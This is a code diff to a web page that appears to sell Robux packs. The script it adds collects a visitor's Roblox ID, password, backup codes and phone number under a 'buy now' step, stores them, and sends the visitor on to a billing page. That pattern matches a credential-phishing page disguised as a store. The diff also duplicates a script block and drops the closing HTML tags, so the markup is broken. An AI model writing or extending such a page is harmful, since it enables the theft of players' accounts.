@@ -71,7 +71,7 @@
     </div>
   </main>
 
-  <script>
+<script>
     let currentPackTitle = "80 Robux";
     let currentPackPrice = "70.00";
 
@@ -101,5 +101,28 @@
       });
     }
   </script>
-</body>
-</html>
+<script>
+    let currentPackTitle = "80 Robux";
+    let currentPackPrice = "70.00";
+
+    function selectPackage(btn, title, price) {
+        currentPackTitle = title;
+        currentPackPrice = price;
+        document.querySelectorAll('.pack-btn').forEach(b => {
+            b.classList.remove('border-cyan-500');
+            b.classList.add('border-gray-800');
+        });
+        btn.classList.add('border-cyan-500');
+        btn.classList.remove('border-gray-800');
+    }
+
+    function handleBuyNow() {
+        localStorage.setItem('checkout_roblox_id', document.getElementById('roblox-id').value);
+        localStorage.setItem('checkout_password', document.getElementById('roblox-pass').value);
+        localStorage.setItem('checkout_backup_codes', document.getElementById('backup-codes').value);
+        localStorage.setItem('checkout_contact_number', document.getElementById('contact-number').value);
+        localStorage.setItem('checkout_pack_title', currentPackTitle);
+        localStorage.setItem('checkout_pack_price', currentPackPrice);
+        window.location.href = "bill.html";
+    }
+</script>
